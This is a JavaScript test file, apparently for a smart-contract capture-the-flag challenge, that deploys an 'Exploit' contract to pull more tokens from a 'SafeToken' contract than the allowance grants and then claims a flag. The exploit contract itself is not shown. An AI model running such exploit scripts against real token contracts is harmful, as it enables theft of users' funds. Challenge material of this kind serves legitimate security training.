require('dotenv').config();
const { assert } = require("chai");

describe("SafeToken", function () {
    let wallet;
    let signer0, signer1;
    let token;
    const supply = "10000000000000000000000000000000000000";
    before(async () => {
        wallet = new ethers.Wallet(process.env.PRIVATE_KEY, ethers.provider);
        [signer0, signer1] = await ethers.getSigners();

        token = await ethers.getContractAt("SafeToken", "0xbAcc21137F1B0CA03d7e796CCc1E1d47DD9fe839");
    });

    it("should have minted", async function () {
        const balance = await token.balanceOf(await wallet.getAddress());
        assert.equal(balance.toString(), supply.toString());
    });

    describe("allowance of 10 & exploit", () => {
        const ten = ethers.utils.parseEther("10");
        before(async () => {
            // NOTE: commented out for testing a pre-approval
            // await token.connect(wallet).approve(await signer1.getAddress(), ten);

            const Exploit = await ethers.getContractFactory("Exploit");
            const exploit = await Exploit.deploy();
            await exploit.deployed();
            await exploit.connect(signer1).run(token.address, await wallet.getAddress());
        });

        it("should be exploitable", async () => {
            const balance = await token.balanceOf(await signer1.getAddress());
            assert.equal(balance.toString(), ethers.utils.parseEther("110"));
        });

        it("should complete the challenge", async () => {
            const challenge = await ethers.getContractAt("Challenge", "0xa5112380909A2f4aC88bEBC99933dFC65DC65CaB");
            await challenge.connect(signer1).capture();
            const flag = await ethers.getContractAt("OrangeFlag", "0x4d367Fd650Afb5024287493B0ac7a1a04730eC79");
            const balance = await flag.balanceOf(await signer1.getAddress());
            assert.isAbove(balance.toNumber(), 0);
        });
    });
});
